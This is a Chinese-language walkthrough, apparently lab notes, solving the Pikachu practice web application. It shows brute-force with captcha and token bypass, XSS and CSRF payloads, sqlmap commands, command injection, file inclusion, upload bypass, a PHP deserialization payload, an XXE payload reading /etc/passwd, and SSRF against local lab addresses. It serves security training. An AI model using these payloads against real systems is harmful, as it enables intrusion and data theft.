# 暴力破解

## 基于表单暴力破解

输入任意密码BP抓包爆破

![](..\img\Pikachu\2022-06-23-20-30-32.png)

爆破用户名密码

![](..\img\Pikachu\2022-06-23-20-40-39.png)

用户名admin，密码123456

![](..\img\Pikachu\2022-06-23-20-45-15.png)

## 基于服务器验证码绕过

BP先开拦截，再输入任意密码BP抓包爆破

![](..\img\Pikachu\2022-06-24-01-15-09.png)

筛选出正确用户名密码数据包

![](..\img\Pikachu\2022-06-24-01-18-05.png)

## 基于客户端验证码绕过

F12可以看到验证码由createCode()函数生成

![](..\img\Pikachu\2022-06-24-17-02-47.png)

查看源代码可以看到验证函数为validate()

![](..\img\Pikachu\2022-06-24-17-21-44.png)

在控制台修改validate函数返回值为true

![](..\img\Pikachu\2022-06-24-17-20-29.png)

输入任意用户名密码和验证码抓包

![](..\img\Pikachu\2022-06-24-17-24-53.png)

此时数据包不经过js判断，发送到爆破模块直接爆破用户名和密码即可

![](..\img\Pikachu\2022-06-24-17-44-06.png)

筛选正确用户名密码

![](..\img\Pikachu\2022-06-24-17-45-51.png)

## 带token爆破

输入任意用户名密码测试，可以看到前一个数据返回包附带的token值会作为下一个请求包中的token，请求包中的token不对的话即使正确的用户名和密码也无法成功登录，这里用单点爆破，Pitchfork模式

![](..\img\Pikachu\2022-06-25-14-54-00.png)

![](..\img\Pikachu\2022-06-25-14-59-48.png)

抓包发送到爆破模块，token部分(payload2配置如下)

![](..\img\Pikachu\2022-06-25-15-32-25.png)

![](..\img\Pikachu\2022-06-25-15-10-47.png)

![](..\img\Pikachu\2022-06-25-15-11-40.png)

筛选正确密码

![](..\img\Pikachu\2022-06-25-15-34-23.png)

# XSS

## 反射型（GET）

改js限制程度插XSS

![](..\img\Pikachu\2022-06-25-15-36-45.png)

## 反射型（POST）

登录后直接XSS

![](..\img\Pikachu\2022-06-25-15-40-01.png)

## 存储型

这里的XSS可以持续性触发

![](..\img\Pikachu\2022-06-25-15-41-14.png)

## DOM型

跟踪点击事件js，可以看到如下代码，这里可以将\<a>标签闭合插入XSS

```js
<script>
    function domxss(){
        var str = document.getElementById("text").value;
        document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
    }
    //试试：'><img src="#" onmouseover="alert('xss')">
    //试试：' onclick="alert('xss')">,闭合掉就行
</script>
```

![](..\img\Pikachu\2022-06-25-16-00-04.png)

## DOM型XSS-X

同样闭合标签即可

```js
function domxss(){
    var str = window.location.search;
    var txss = decodeURIComponent(str.split("text=")[1]);
    var xss = txss.replace(/\+/g,' ');

//  alert(xss);
    document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
}
//试试：'><img src="#" onmouseover="alert('xss')">
//试试：' onclick="alert('xss')">,闭合掉就行
```

![](..\img\Pikachu\2022-06-27-09-27-55.png)

## XSS盲打

盲打前台看不到回显，需要登录到后台才能看到

![](..\img\Pikachu\2022-06-27-09-32-22.png)

后台视角

![](..\img\Pikachu\2022-06-27-09-32-53.png)

## XSS过滤 

这里\<script>标签被过滤，大小写绕过即可

![](..\img\Pikachu\2022-06-27-09-37-08.png)

## XSS之htmlspecialchars

这里用了htmlspeciachars方法过滤输入的内容，特殊字符被转义成html实体

测试特殊字符，可以看到单引号未被过滤

![](..\img\Pikachu\2022-06-27-09-59-52.png)

利用单引号插入XSS

![](..\img\Pikachu\2022-06-27-09-56-28.png)

## XSS之href输出

利用js伪协议插入XSS

![](..\img\Pikachu\2022-06-27-10-07-12.png)

## XSS之js

闭合前面的标签，接上XSS语句，注释尾部代码

```js
<script>
    $ms='123';
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
//            alert($ms);
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }

    }
</script>
```

![](..\img\Pikachu\2022-06-27-11-03-00.png)

# CSRF

## CSRF(get)

登录系统预置用户，修改信息抓包，直接修改url参数中的参数即可修改用户信息，以此生成恶意链接

>http://192.168.10.52/pkq/vul/csrf/csrfget/csrf_get_edit.php?sex=2&phonenum=2&add=2&email=2&submit=submit

![](..\img\Pikachu\2022-06-27-11-20-14.png)

在用户已经登录(用户浏览器存在有效cookie)时，诱导用户点击恶意链接即可使其修改个人信息,可以和存储型xss组合使用，危害更大

![](..\img\Pikachu\2022-06-27-11-39-47.png)

## CSRF(post)

post参数在请求体中，所以需要诱导用户提交表单数据才能完成攻击，一般需要仿造一个正常页面欺骗用户点击

```html
<form method="post" action="http://192.168.10.52/pkq/vul/csrf/csrfpost/csrf_post_edit.php">
   <h1 class="per_title">hello,,欢迎来到个人会员中心 | <a style="color:bule;" href="csrf_post.php?logout=1">退出登录</a></h1>
   <p class="per_name">姓名:</p>
   <p class="per_sex">性别:<input type="text" name="sex" value=""/></p>
   <p class="per_phone">手机:<input class="phonenum" type="text" name="phonenum" value=""/></p>    
   <p class="per_add">住址:<input class="add" type="text" name="add" value=""/></p> 
   <p class="per_email">邮箱:<input class="email" type="text" name="email" value=""/></p> 
   <input class="sub" type="submit" name="submit" value="submit"/>
</form>
```
![](..\img\Pikachu\2022-06-27-14-18-11.png)

![](..\img\Pikachu\2022-06-27-14-17-47.png)

## CSRF token

增加了token验证，且每次服务器返回的token值都会发生变化，form发起的POST请求不受浏览器同源策略限制，但token不会自动添加到请求包Header中，攻击者也无法访问到用户的token，所以配置了token便无法利用CSRF攻击

![](..\img\Pikachu\2022-06-27-14-31-06.png)

# SQL注入

## 数字型注入(POST)

直接sqlmap梭

```cmd
python3 sqlmap.py -u "http://192.168.10.52/pkq/vul/sqli/sqli_id.php" --cookie "ocKey=660cdd6ca5dfc10527d75f6ec6c469c8; PHPSESSID=b19evnjk8vp4qmjhk3fj8ka6v4" --data "id=1&submit=%E6%9F%A5%E8%AF%A2" -p "id" --batch
```

![](..\img\Pikachu\2022-06-27-15-01-32.png)

## 字符型注入(GET)

```
python3 sqlmap.py -u "http://192.168.10.52/pkq/vul/sqli/sqli_str.php?name=vince%27+and+1%3D%272%23&submit=%E6%9F%A5%E8%AF%A2" --cookie "ocKey=660cdd6ca5dfc10527d75f6ec6c469c8; PHPSESSID=b19evnjk8vp4qmjhk3fj8ka6v4" --thread 8 --tech U --dbms mysql
```

![](..\img\Pikachu\2022-06-27-16-07-55.png)

## 搜索型注入

```cmd
python3 sqlmap.py -u "http://192.168.10.52/pkq/vul/sqli/sqli_search.php?name=vin&submit=%E6%90%9C%E7%B4%A2" --cookie "ocKey=660cdd6ca5dfc10527d75f6ec6c469c8; PHPSESSID=b19evnjk8vp4qmjhk3fj8ka6v4" --thread 8 --dbms mysql --batch
```

![](..\img\Pikachu\2022-06-27-17-16-19.png)

## xx型注入

闭合符为')

![](..\img\Pikachu\2022-06-27-17-34-10.png)

## "insert/upadte"注入

insert和update不像select语句有返回结果，可以使用报错注入，破坏原sql语句使其发生报错并回显

![](..\img\Pikachu\2022-06-27-18-51-46.png)

## "delete"注入

这里的delete通过数据库中寻找id并删除，注入点在id

![](..\img\Pikachu\2022-06-27-18-58-36.png)

## "http header"注入

这里由于服务器设置将记户端信息记录到数据库，客户端信息与数据库交互时没有被限制，当在header头中的信息是SQL语句时可以被执行

![](..\img\Pikachu\2022-06-27-19-04-45.png)

## 布尔盲注

没有数据回显，但页面会根据SQL语句执行是否正确发生变化，可以通过这个变化猜数据库的内容

![](..\img\Pikachu\2022-06-27-19-11-34.png)

![](..\img\Pikachu\2022-06-27-19-11-52.png)

## 时间盲注

若既没有数据回显，页面也不会发生变化，可以通过设置页面响应时间来判断SQL语句是否正确执行

![](..\img\Pikachu\2022-06-27-19-15-13.png)

## 宽字节注入

由于在使用了转义函数将单引号'转换成\'的同时设置sql编码为gbk，注入的时候在'前面加%df，作为%df'传入时经过转义变成%df\'，16进制编码变成%df%5c%27,由于gbk编码占两个字节，%df%5c会被gbk编码作为一个宽字符处理，而后面的%27则作为正常单引号注入SQL

![](..\img\Pikachu\2022-06-27-19-41-41.png)

# RCE

## exec"ping"

同DVWA一样，可以在IP后加上命令拼接符来命令执行

![](..\img\Pikachu\2022-06-27-19-44-18.png)

## exec"evel"

这里可以直接输入命令执行语句，例如输入phpinfo();

![](..\img\Pikachu\2022-06-27-19-45-52.png)

# file inclusion

## file inclusion(local)

文件包含，利用目录穿越读取本地文件

![](..\img\Pikachu\2022-06-27-20-01-05.png)

## file inclusion(remote)

可以远程加载任意文件，危害极大

![](..\img\Pikachu\2022-06-27-20-05-51.png)

# Unsafe Filedownload

任意文件下载

![](..\img\Pikachu\2022-06-27-20-09-25.png)

# Unsafe Fileupload

## client check

本地js判断数据类型，在判断内容中添加php删掉在控制台执行空checkFileExt()即可绕过

```js
<script>
    function checkFileExt(filename)
    {
        var flag = false; //状态
        var arr = ["jpg","png","gif"];
        //取出上传文件的扩展名
        var index = filename.lastIndexOf(".");
        var ext = filename.substr(index+1);
        //比较
        for(var i=0;i<arr.length;i++)
        {
            if(ext == arr[i])
            {
                flag = true; //一旦找到合适的，立即退出循环
                break;
            }
        }
        //条件判断
        if(!flag)
        {
            alert("上传的文件不符合要求，请重新选择！");
            location.reload(true);
        }
    }
</script>
```
![](..\img\Pikachu\2022-06-27-20-22-19.png)

![](..\img\Pikachu\2022-06-27-20-22-44.png)

## MIME type

抓包改Content-type即可

![](..\img\Pikachu\2022-06-27-20-24-15.png)

## getimagesize

getimagesize函数会检测文件前两个字节是否为图片类型，所以这里只能是图片，只能通过上传图片码配合文件包含完成组合攻击

![](..\img\Pikachu\2022-06-27-20-39-54.png)

![](..\img\Pikachu\2022-06-27-20-41-45.png)

# Over Oermission

## 水平越权

修改username可以查看其他人信息

![](..\img\Pikachu\2022-06-27-20-47-25.png)

## 垂直越权

由于创建用户页面未对用户身份验证，普通用户也可以访问并创建用户

登录admin管理员创建用户，复制创建用户的url

![](..\img\Pikachu\2022-06-27-23-06-55.png)

再登录pikachu用户，直接访问创建用户的url创建test用户

![](..\img\Pikachu\2022-06-27-23-09-08.png)

再次登录pikachu用户，可以看见test用户被成功创建

![](..\img\Pikachu\2022-06-27-23-09-41.png)

# 目录遍历

以相对路径访问其他文件

![](..\img\Pikachu\2022-06-27-23-20-23.png)

# 敏感信息泄露

用户可以直接访问目录，并查看其他敏感文件

![](..\img\Pikachu\2022-06-27-23-30-07.png)

# PHP反序列化

```php
class S{
	public $test="pikachu";
}
$s = new S(); //新建一个对象
serialize($s); //序列化对象s

/*******************************
序列化这个对象之后得到的是 O:1:"S":1:{s:4:"test";s:7:"pikachu";}
O-----代表object
1-----对象名字长度
S-----对象名
1---------对象里面有一个变量
s--------string数据类型
4-------数据变量名称长度
test------变量名称
s-------数据类型
7-------变量值长度
pikachu------变量值

******************************/

// 反序列化
$u = unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
echo $u->test; //取得test的值为pikachu

// 如果反序列化的内容是用户可以控制的，且后台不正确使用了php中的魔法函数，就会出现安全问题。常见魔法函数有
__construct()  //创建对象时候使用
__destruct()   // 销毁对象时使用
__toString()   // 对象当成字符串时使用
__sleep()   //对象序列化之前运行
__wakeup() // 序列化之后立即被调用
  
// 漏洞举例
class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

[参考链接](https://blog.csdn.net/cynthrial/article/details/106688203)

![](..\img\Pikachu\2022-06-28-01-15-37.png)

# XXE

## xml外部实体注入攻击

引用外部实体构造读取/etc/passwd的payload的

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
	<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```
![](..\img\Pikachu\2022-06-28-01-52-18.png)

# url跳转

## 未做限制导致url可以任意跳转

直接访问构造的链接，可以跳转到百度页面

```
http://127.0.0.1:8001/vul/urlredirect/urlredirect.php?url=www.baidu.com
```

# SSRF

## SSRF(curl)

可以通过构造url，带出百度页面

```
http://127.0.0.1:8001/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
```

![](..\img\Pikachu\2022-06-28-03-09-32.png)

# SSRF(file_get_content)

同样可以带出百度

![](..\img\Pikachu\2022-06-28-03-40-48.png)

